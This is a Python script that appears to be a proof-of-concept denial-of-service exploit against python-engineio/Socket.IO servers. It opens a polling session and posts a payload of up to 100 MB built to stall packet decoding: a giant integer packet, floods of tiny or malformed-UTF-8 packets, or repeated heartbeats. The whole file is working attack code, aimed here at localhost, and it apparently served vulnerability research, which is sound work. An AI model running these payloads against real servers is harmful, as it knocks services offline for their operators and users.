import re
import time

import requests


def repeat_packet(packet, total_length):
    repetitions = total_length // len(packet)
    return packet * repetitions


def standard_payload(total_length):
    # 4 means MESSAGE in engineio (data[0])
    # 2 means EVENT (non-binary) in socketio (data[1])
    # data_length : data
    return repeat_packet(
        '40:42["my event",{"data":"I\'m connected!"}]',
        total_length,
    )


def giant_packet(total_length):
    # 4 means MESSAGE in engineio (data[0])
    # Then we follow with a massive integer
    # to cause iteration in socketio.Packet.decode
    prefix = '4'
    data_length = total_length - 2
    while data_length + 1 + len(str(data_length)) > total_length:
        data_length -= 1
    packet = '%d:%s' % (data_length, prefix + '2' * (data_length - len(prefix)))
    return packet


def many_tiny_packets(total_length, bad_utf8=False):
    # 4 means MESSAGE in engineio (data[0])
    # 2 means EVENT (non-binary) in socketio (data[1])
    # But previously putting a character >0x80 in data
    # slowed down encoded_payload.decode('utf-8', errors='ignore') even more
    # The bad_utf8 issue has now been fixed in python-engineio master
    return repeat_packet(
        '2:4\xbc' if bad_utf8 else '2:42',
        total_length,
    )


def many_heartbeats(total_length):
    return repeat_packet(
        '1:2',
        total_length,
    )


def timestr():
    return "&t=" + str(time.time())


def attack(host, payload_length=100000000, make_payload=many_tiny_packets):
    # engineio default max length is 10 meg
    base_url = host + "/socket.io/?EIO=3&transport=polling"
    # Create session
    response = requests.get(base_url + timestr()).text
    print("Response from server", repr(response))
    sid = re.search("\"sid\":\"([^\"]+)\"", response).group(1)
    print("Got session", sid)
    session_url = base_url + "&sid=" + sid
    # Fire payload
    payload = make_payload(payload_length)
    print("Firing payload of length", len(payload), repr(payload[:100]))
    try:
        start_time = time.time()
        final_response = requests.post(
            session_url + timestr(),
            data=payload,
            headers={'Content-Type': 'text/plain'},
        ).text
        print("Server returned", repr(final_response))
    except requests.exceptions.ConnectionError as e:
        print(e)
    finally:
        print("Duration:", int(time.time() - start_time))


def x(payload_length=100000000, make_payload=many_tiny_packets):
    return attack("http://127.0.0.1:5000", payload_length, make_payload)
